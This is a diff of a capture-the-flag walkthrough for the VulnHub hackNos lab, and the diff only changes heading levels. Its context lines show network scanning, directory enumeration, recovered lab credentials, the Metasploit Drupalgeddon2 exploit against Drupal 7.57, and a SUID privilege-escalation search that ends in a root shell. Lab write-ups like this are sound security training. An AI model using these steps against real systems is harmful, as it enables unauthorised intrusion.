@@ -4,9 +4,7 @@
 Available on VulnHub: https://www.vulnhub.com/entry/hacknos-os-hacknos,401/
 
 
-## Walkthrough
-
-### IP Discovery
+## IP Discovery
 
 ```
 $ sudo netdiscover -r 192.168.1.0/16
@@ -29,7 +27,7 @@ xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
-### Port Scanning
+## Port Scanning
 
 ```
 $ nmap -AT4 -p- 192.168.1.184
@@ -55,7 +53,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 8.90 seconds
 ```
 
-### Web Analysis
+## Web Analysis
 
 ```
 $ dirb http://192.168.1.184
@@ -174,7 +172,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ===============================================================
 ```
 
-### alexander.txt Analysis
+## alexander.txt Analysis
 
 Downloading and analysing `alexander.txt` file.
 ```
@@ -216,7 +214,7 @@ Credentials:
 * User: james
 * Pass: Hacker@4514
 
-### Drupal Access
+## Drupal Access
 
 This credentials allow us to login with **james** account in Drupal admin area.
 ```
@@ -225,7 +223,7 @@ User: james
 Pass: Hacker@4514
 ```
 
-### Serching Vulnerabilities
+## Serching Vulnerabilities
 
 After login we can find Drupal version: `7.57`\
 \
@@ -243,7 +241,7 @@ Matching Modules
    0  exploit/unix/webapp/drupal_drupalgeddon2  2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection
 ```
 
-### Exploiting
+## Exploiting
 
 ```
 msf6 > use exploit/unix/webapp/drupal_drupalgeddon2
@@ -300,7 +298,7 @@ www-data@hackNos:/var/www/html/drupal$ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-### Flag #1 - User
+## Flag #1 - User
 
 ```
 www-data@hackNos:/home/james$ cat user.txt
@@ -314,7 +312,7 @@ www-data@hackNos:/home/james$ cat user.txt
 MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b
 ```
 
-### Privilege Escalation
+## Privilege Escalation
 
 ```
 www-data@hackNos:/home/james$ find / -type f -perm -u=s 2>/dev/null
@@ -417,7 +415,7 @@ root@hackNos:/# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-### Flag #2 - Root
+## Flag #2 - Root
 
 ```
 root@hackNos:~# cat /root/root.txt
